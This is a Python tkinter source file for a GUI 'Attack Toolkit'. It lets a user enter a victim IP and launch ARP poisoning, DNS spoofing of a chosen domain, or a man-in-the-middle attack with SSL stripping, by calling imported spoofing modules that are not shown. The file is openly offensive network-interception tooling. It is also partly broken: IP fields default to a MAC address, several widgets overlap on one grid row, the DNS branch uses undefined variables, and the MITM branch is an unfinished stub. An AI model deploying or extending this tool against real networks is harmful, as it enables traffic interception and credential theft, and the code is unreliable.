import tkinter as tk
from tkinter import scrolledtext, ttk
from Arp_poisening import ARPPoisoner
import uuid
import threading
import Dns_spoofing
import scapy.all as sc
from mitm_handler import MitmHandler


class AttackGUI:
    def __init__(self, root):
        self.root = root
        root.title("Attack Toolkit")

        # ARP options
        self.arp_frame = tk.Frame(root)

        tk.Label(self.arp_frame, text="Victim IP: (Optional)").grid(row=0, column=0, sticky="e", padx=5, pady=3)
        self.victim_entry = tk.Entry(self.arp_frame, width=23)
        self.victim_entry.grid(row=0, column=1, padx=5, pady=3)

        tk.Label(self.arp_frame, text="Server IP: (Optional)").grid(row=1, column=0, sticky="e", padx=5, pady=3)
        self.arp_server_entry = tk.Entry(self.arp_frame, width=23)
        self.arp_server_entry.grid(row=1, column=1, padx=5, pady=3)

        tk.Label(self.arp_frame, text="ARP Mode:").grid(row=2, column=0, sticky="e", padx=5, pady=3)
        self.arp_mode = ttk.Combobox(
            self.arp_frame,
            values=["silent", "all-out"],
            state="readonly",
            width=20
        )
        self.arp_mode.grid(row=2, column=1, padx=5, pady=3)
        self.arp_mode.current(1)

        tk.Label(self.arp_frame, text="Spoof As MAC:").grid(row=3, column=0, sticky="e", padx=5, pady=3)
        self.spoof_entry = tk.Entry(self.arp_frame, width=23)
        self.spoof_entry.grid(row=3, column=1, padx=5, pady=3)
        self.spoof_entry.insert(0, self.get_attacker_mac())

        tk.Label(self.arp_frame, text="Spoof As IP:").grid(row=4, column=0, sticky="e", padx=5, pady=3)
        self.spoof_ip_entry = tk.Entry(self.arp_frame, width=23)
        self.spoof_ip_entry.grid(row=3, column=1, padx=5, pady=3)
        self.spoof_ip_entry.insert(0, self.get_attacker_mac())\
        
        tk.Label(self.arp_frame, text="Spoof As IPv6:").grid(row=5, column=0, sticky="e", padx=5, pady=3)
        self.spoof_ipv6_entry = tk.Entry(self.arp_frame, width=23)
        self.spoof_ipv6_entry.grid(row=3, column=1, padx=5, pady=3)
        self.spoof_ipv6_entry.insert(0, self.get_attacker_mac())

        # DNS options
        self.dns_frame = tk.Frame(root)

        tk.Label(self.dns_frame, text="Victim IP:").grid(row=0, column=0, sticky="e", padx=5, pady=3)
        self.dns_victim_entry = tk.Entry(self.dns_frame, width=23)
        self.dns_victim_entry.grid(row=0, column=1, padx=5, pady=3)

        tk.Label(self.dns_frame, text="Domain to Spoof:").grid(row=1, column=0, sticky="e", padx=5, pady=3)
        self.dns_domain_entry = tk.Entry(self.dns_frame, width=23)
        self.dns_domain_entry.grid(row=1, column=1, padx=5, pady=3)

        tk.Label(self.dns_frame, text="Spoof IPv4:").grid(row=2, column=0, sticky="e", padx=5, pady=3)
        self.dns_spoof_ip_entry = tk.Entry(self.dns_frame, width=23)
        self.dns_spoof_ip_entry.grid(row=2, column=1, padx=5, pady=3)

        tk.Label(self.dns_frame, text="Spoof IPv6 (optional):").grid(row=3, column=0, sticky="e", padx=5, pady=3)
        self.dns_spoof_ipv6_entry = tk.Entry(self.dns_frame, width=23)
        self.dns_spoof_ipv6_entry.grid(row=3, column=1, padx=5, pady=3)


        # MITM options
        self.mitm_frame = tk.Frame(root)

        tk.Label(self.mitm_frame, text="Victim IP: (optional)").grid(row=0, column=0, sticky="e", padx=5, pady=3)
        self.mitm_victim_entry = tk.Entry(self.mitm_frame, width=23)
        self.mitm_victim_entry.grid(row=0, column=1, padx=5, pady=3)

        tk.Label(self.mitm_frame, text="Server IP: (optional)").grid(row=1, column=0, sticky="e", padx=5, pady=3)
        self.mitm_server_entry = tk.Entry(self.mitm_frame, width=23)
        self.mitm_server_entry.grid(row=1, column=1, padx=5, pady=3)

        self.ssl_var = tk.BooleanVar()
        self.ssl_var = tk.BooleanVar(value=True)
        self.ssl_checkbox = tk.Checkbutton(
            self.mitm_frame, 
            text="Use SSL Stripping", 
            variable=self.ssl_var
        )
        self.ssl_checkbox.grid(row=2, column=0, columnspan=2, padx=5, pady=3)

        # Attack options
        tk.Label(root, text="Select Attack:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
        self.attack_choice = ttk.Combobox(
            root,
            values=["ARP Poisoning", "DNS Spoofing", "MITM (With SSL stripping)"],
            state="readonly",
            width=23
        )
        self.attack_choice.grid(row=0, column=1, padx=5, pady=5)
        self.attack_choice.current(0)
        self.attack_choice.bind("<<ComboboxSelected>>", self.update_attack_options)

        # start button
        self.btn_start = tk.Button(root, text="Start Attack", command=self.start_attack)
        self.btn_start.grid(row=2, column=0, columnspan=2, sticky="we", padx=5, pady=10)

        # Log output
        tk.Label(root, text="Packet Log:").grid(row=3, column=0, columnspan=2)
        self.log_area = scrolledtext.ScrolledText(root, width=70, height=18)
        self.log_area.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

        self.update_attack_options()

    # Utility
    def log(self, text):
        self.root.after(0, lambda: (
            self.log_area.insert(tk.END, text + "\n"),
            self.log_area.see(tk.END)
        ))

    def get_attacker_mac(self):
        try:
            mac = uuid.getnode()
            return ':'.join(f'{(mac >> ele) & 0xff:02x}' for ele in range(40, -1, -8))
        except:
            return "00:00:00:00:00:00"

    def update_attack_options(self, event=None):
        self.arp_frame.grid_forget()
        self.dns_frame.grid_forget()
        self.mitm_frame.grid_forget()

        attack = self.attack_choice.get()

        if attack == "ARP Poisoning":
            self.arp_frame.grid(row=1, column=0, columnspan=2, sticky="w", padx=5, pady=5)

        elif attack == "DNS Spoofing":
            self.dns_frame.grid(row=1, column=0, columnspan=2, sticky="w", padx=5, pady=5)

        else:
            self.mitm_frame.grid(row=1, column=0, columnspan=2, sticky="w", padx=5, pady=5)

    # Attack Logic
    def start_attack(self):
        attack = self.attack_choice.get()

        def worker():
            # ARP POISONING
            if attack == "ARP Poisoning":
                victim = self.victim_entry.get().strip() or None
                server_ip = self.arp_server_entry.get().strip()
                spoof_mac = self.spoof_entry.get().strip()
                spoof_ip = self.spoof_ip_entry.get().strip()
                spoof_ip_v6 = self.spoof_ipv6_entry.get().strip()
                mode = self.arp_mode.get()

                self.log("Starting ARP poisoning:")
                self.log(f"  Victim:    {victim}")
                self.log(f"  Server:    {server_ip}")
                self.log(f"  Mode:      {mode}")
                self.log(f"  Spoof As:  {spoof_mac}")

                # To Do automatically figure out gateway here?
                # To Do get own IP / IPv6 and MAC automatically?
                mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim, spoof_mac, spoof_ip, spoof_ip_v6, self.log)
                spoofer = ARPPoisoner(sc.conf.iface, victim, server_ip, spoof_mac, self.log)

                mitm_handler.start()
                spoofer.start()

            # DNS SPOOFING
            elif attack == "DNS Spoofing":
                victim_ip = self.dns_victim_entry.get().strip()
                domain = self.dns_domain_entry.get().strip().lower()
                spoof_ip = self.dns_spoof_ip_entry.get().strip()
                spoof_ipv6 = self.dns_spoof_ipv6_entry.get().strip() or None

                if not victim_ip or not domain or not spoof_ip:
                    self.log("DNS spoofing error: missing required fields")
                    return

                dns_map = {domain: spoof_ip}

                self.log("Starting DNS spoofing:")
                self.log(f"  Victim IP: {victim_ip}")
                self.log(f"  Domain:    {domain}")
                self.log(f"  IPv4:      {spoof_ip}")
                self.log(f"  IPv6:      {spoof_ipv6 or 'disabled'}")

                spoofer = Dns_spoofing.DNSSpoofer(
                    interface=sc.conf.iface,
                    victim_ip=victim_ip,
                    dns_mapping=dns_map,
                    attacker_ip=spoof_ip,
                    attacker_ipv6=spoof_ipv6,
                    logger=self.log
                )
                
                mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim, spoof_mac, spoof_ip, spoof_ip_v6, self.log)
                mitm_handler.add_filter(spoofer._dns_filter)
                mitm_handler.start()
                spoofer.start()

            # MITM
            else:
                victim = self.mitm_victim_entry.get().strip() or None
                server_ip = self.mitm_server_entry.get().strip() or None
                use_ssl = self.ssl_var.get()

                self.log("Starting MITM attack:")
                self.log(f"  Victim IP:  {victim}")
                self.log(f"  Server IP:  {server_ip}")
                self.log(f"  SSL Strip:  {use_ssl}")

                # TODO: call MITM function

        threading.Thread(target=worker, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    gui = AttackGUI(root)
    root.mainloop()